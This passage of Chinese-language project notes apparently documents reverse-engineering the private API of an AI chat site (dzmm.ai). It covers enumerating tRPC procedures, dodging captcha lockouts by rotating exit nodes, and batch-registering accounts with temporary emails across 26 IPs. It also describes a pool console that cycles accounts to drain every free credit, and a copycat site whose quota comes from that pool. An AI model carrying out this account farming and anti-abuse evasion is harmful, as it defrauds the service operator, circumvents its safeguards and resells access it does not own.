7. **mitmproxy 抓不到 SSE**：加 `--set stream_large_bodies=1k`，否则生成流被缓冲到结束才落 flow。
8. **bundle 里的 `quota` 字样多半是 i18n 文案**：`chat.getQuotas` / `credits.getBalance` 才是接口，别在文案里找逻辑。
9. **418 captcha 闸门**：无 UA 伪装、无 cookie 连打约 15 发 `/api/trpc` 就被锁，锁后真实接口也 418。枚举必须 ≤1 rps、先带 `chosen_language`/`_geo` cookie、锁了立刻换出口节点。
10. **cache key ≠ procedure 路径**：bundle 里 `xx.yy` 形式的字符串大多是 React Query key，`/api/trpc/` 下 404；真实 procedure 名以抓包为准。
11. **418 跟出口节点走**：同一站点换节点就能从 418 变回 401；先切节点再排查，别一上来就去解验证码。`curl (35) schannel` = 节点坏，直接换。
12. **`cardId` 必须与 chatId 属主卡片一致**，否则一律 `403`（空 body），与会话新旧、手机/浏览器头无关；
   建会话必须换卡片（`createByCard` 按 cardId 去重），部分卡片会报 `404 对话数据异常`；可用卡片清单见 `notes/005` §4。
   （notes/004 把 403 归因于“新会话不放行”，已作废。）
14. **余额不足不是 402**：HTTP 仍是 200，SSE 里才抛 `upgrade_needed/credit`，且不扣费 —— 判断成功必须看到 `"type":"complete"`。
15. **仓库名是 `qsy123-coder/lan-ai`**（不是 `qsyyq-coder`，后者 404）。`git remote -v` 为准。
16. **`out/` 下的 `site_pass.txt` / `site_token.txt` 是每次生成的新随机值**。若前台进程是上一次跑起的
    （`start-site.ps1` 只判断端口是否在听，`Test-Port` 为真就跳过重启），它的 `SITE_PASS` 还是旧值，
    会导致 `/api/enter` 一律 `401 口令不对`、所有页面 `307 → /enter`。
    **排查口诀**：比对「口令文件 mtime」与「:3100 进程 StartTime」，前者更晚就必须杀掉重起。
17. **`/site/pool` 的 `credit` 读 `out/webstate.json`，不是 `accounts.json` 的 `last.credit`**。
    新机器上 `webstate.json` 不存在 → 21 个号全 `credit=0`、`usable=0`。
    必须先 `POST /refresh`（21 号约 66s）做体检把状态写进 `webstate.json`，`usable` 才会正常。
    `GET /site/pool` 只读不体检，不会自己补。
18. **引擎 SSE 用 `event:` 行表类型，不是 JSON 里带 `"type"`**。本站判成功的标准是
    `event: complete` + 正文 + `credit` 字段（已结算后余额），**不是** `"type":"complete"`。
    后者是上游 dzmm 原生 `/api/chat` 的格式，两套不同，别混用判据。
19. **`/chat` 返回 307 不一定是登录拦截**。无 `card` 参数时会 307 到 `/chat?card=<默认卡>`，
    这是正常路由行为；`/` 无 cookie 的 307 才是跳 `/enter`。看 `location` 头再下结论。
20. **`/api/enter` 的字段名是 `p`**，不是 `pass` 也不是 `password`（`app/api/enter/route.js`）。
21. **可移植性**：`start.ps1` / `start-site.ps1` 里的 `$PY/$NODE/$PNPM` 已改为三级探测
    （`$env:LAN_*` → DSH 运行时 → `Get-Command`）。给别的机器时仍要确认 DSH 运行时是否存在，
    否则靠 `Get-Command python/node`，系统没装会直接抛错。`$env:LAN_PY` / `LAN_NODE` / `LAN_PNPM` 可覆盖。
    另：脚本里的 ` 2>&1` 已全部删除 —— PowerShell 5.1 会把原生命令的 stderr 当终止错误，
    `git clone` / `next build` 正常输出 `Cloning into...` 也会让脚本崩。
22. **首页广告位 `.zc-ad` 只有 CSS 没有 JSX**（globals.css L689 起 10 处样式，组件未实现）。
    来源是上次重构。参考图里有广告位，属于待补项，不是本机搭建引入。


---

## 12. 占位符表

| 占位符 | 含义 | 取值方式 |
|---|---|---|
| `TARGET` | 站点根 | `https://www.dzmm.ai` |
| `PROC` | tRPC procedure | `captures/*/trpc.jsonl` 里 `path` 的 `/api/trpc/` 之后 |
| `COOKIE` | 登录态 | 浏览器 DevTools → Application → Cookies，整串粘贴 |
| `CLIENT_HDR` | `x-dzmm-client` | 同上，请求头里最新的那个值 |
| `PATH` | 接口路径 | 含 query，从抓包原样复制 |
| `BODY` | 请求体 | 存 `notes/<proc>.body.json`，脚本读文件 |
| `WORDLIST` | 枚举字典 | `wordlists/procedures.txt`（从 bundle 正则抽的 procedure 名） |
| `CONCURRENCY` | 并发数 | 8 / 12 / 16，逐级 |
| `RATE` | 每秒请求 | ≤ 2 |
| `RESULT_LOG` | 结果落盘 | `out/<日期>-<proc>.jsonl` |

---

## 13. 回滚与清理

```powershell
# 停抓包
Get-Process mitmdump,mitmweb -ErrorAction SilentlyContinue | Stop-Process -Force

# 还原浏览器代理（独立 profile 直接删，不动系统设置）
Remove-Item -Recurse -Force "$env:TEMP\dzmm-prof"

# 还原证书（如装过）
certutil -delstore Root "mitmproxy"

# 清理环境变量
Remove-Item Env:HTTPS_PROXY,Env:HTTP_PROXY -ErrorAction SilentlyContinue

# 只保留原始 flow，重跑分析前清产物
Remove-Item -Recurse -Force out\*,notes\*.tmp -ErrorAction SilentlyContinue
```

---

## 14. 会话开场检查（30 秒）

1. `Get-NetTCPConnection -State Listen | ? LocalPort -in 7897,8081` —— 代理与抓包都在听？
2. `curl.exe --proxy http://127.0.0.1:7897 -sS -o nul -w "%{http_code}" https://www.dzmm.ai/` —— 200？
3. `captures/` 里最新目录的 `trpc.jsonl` 是否是**本次**的（不是上周的）？
4. 当前要打的是 A–G 哪一条？上一轮的结论写在 `notes/` 哪一页？

四项齐了再开工。

---

## 15. Web 控制台（2026-11-07 新增，已跑通）

账号池的可视化应用：**一条提示词 → 自动跨号连续生成 → 打光全部 credit**。

| 组件 | 路径 | 说明 |
|---|---|---|
| 引擎 | `engine/server.py` | stdlib HTTPServer + curl_cffi，监听 `127.0.0.1:8787` |
| 界面 | `web/` | Next.js 15 App Router，`127.0.0.1:3000` |
| 启停 | `start.ps1` / `stop.ps1` | 首次自动同步源码 → 本地运行副本、装依赖、构建 |
| 运行态 | `out/webstate.json` | 每号 credit / chat_id / card_id / dead_cards / exhausted |
| 结果 | `out/web_results.jsonl` | 每次生成的 prompt / 账号 / 正文 / 扣费 |

轮换：体检 → 按 **credit 升序**挑号 → `chat.createByCard` 扫 `CARDS`（11 张，坏的自动拉黑）→
`POST /api/chat` SSE 流式 → `user.getMe` 结算 → 余额 < 3.4 或 `upgrade_needed/credit` 即切号。

**新踩的坑（重要）**：`/api/trpc` 与 `/api/chat` 缺 `sec-fetch-dest/mode/site` + `accept` 时一律
`403 Forbidden`（空 body）；`headers_of()` 已固化这几个头，不要删。实测 `createByCard` 加上后 200。

**构建约束**：工程在 UNC 共享上，Next.js 无法在共享路径构建（webpack 解析 `next-*` loader 失败、
SMB 不支持硬链接/符号链接）。因此运行副本放 `%LOCALAPPDATA%\dzmm-web`，`web/` 只存源码；
`start.ps1` 负责 robocopy 同步，源码改动后自动重建（或 `-Rebuild` 强制）。

**已验证链路**（2026-11-07 23:5x，g01）：
`createByCard(3821218)` → `chatId` → `/api/chat`（turbo，maxTokens 120）→ SSE delta + complete →
credit 72.53 → 70.82（扣 1.71），结果落 `out/web_results.jsonl`。

**手动停用 vs 自动耗尽**：`out/webstate.json` 里拆成两个字段 —— `disabled`（手动，体检不覆盖）与
`exhausted`（体检按余额重算）。UI 分别显示「手动停用 / 已耗尽」；`/account` 传 `{"enabled":false}` 才停用。
（教训：早期只有 `exhausted` 一个字段，点「停用」会被下一次开跑体检立刻启回来。）

**批量补号（2026-11-10 23:37 起）**：`scripts/batch_signup*.py` 按 `out/ip_ledger.json` 轮换 26 个出口节点
（每节点 1–2 次），临时邮箱注册 + 拖拽 + 8 位码，逐个写 `accounts.json`（`b001`…）。约 2 分钟/号。

---

## 16. 同类站「澜」（2026-11-11，四屏已跑通）

按 `notes/008` 拆解 + `design.md` 液态玻璃做的同类站，额度直连池子。

| 组件 | 路径 | 说明 |
|---|---|---|
| 前台 | `site/` | Next.js 15，`127.0.0.1:3100`；首页 / 卡详情 / 聊天 / 关于 |
| 启动 | `start-site.ps1` | 同步 → 构建 → 起引擎(:8787) + 前台(:3100) |
| 卡片库 | `captures/site/cards.json` | `scripts/seed_cards.py` 从榜单抓 `card.getById` |
| 引擎接口 | `POST /site/chat` | `{cardId,prompt,model,maxTokens}` → 挑号→createByCard→SSE→结算 |

**关键**：`ensure_chat_for_card()` 按「号 × 卡」缓存 chatId（`webstate.json: site_chats`），
卡不可用/余额不足/401 自动换号；会话与消息存浏览器 localStorage。
详见 `notes/009-site-clone.md`。

**对话升级（2026-11-11）**：引擎 `normalize_history()` 支持多轮（24 条 / 16k 字），前端解析 `<sug>` 建议回复、支持重生成/删除/停止，会话列表按日期分组。验证：带历史问「我叫什么」→ 答出前文姓名。

**长期记忆（2026-11-13，`engine/memory.py`）**：**上游 `/api/chat` 只认 `content`，`prompts[]` 里的历史/记忆被完全忽略**（暗号 `LANOK` 实测：放 prompts 里模型看不到，放 content 里第一句就出现）。所以记忆改走 `memlib.content_prefix()` 拼进当前消息：`content = 长期设定 + 前情摘要 + 执行要求 + 用户正文`。锚点 `pinned`（自动抽取 + 手动，上限 20 条 / 单条 1500 字）+ 摘要 `summary`（600 字）落 `out/memory/<cardId>.json`；引擎 `/site/memory` GET/POST 读写，前端记忆面板走 `/api/memory`。执行要求已覆盖动作型设定（冲上来/扑上来/吃等当回合直接做，不许装凶/岔话题回避），"相遇/同处一室/看见"均视同触发。详见 `notes/015-memory-content-injection.md`。
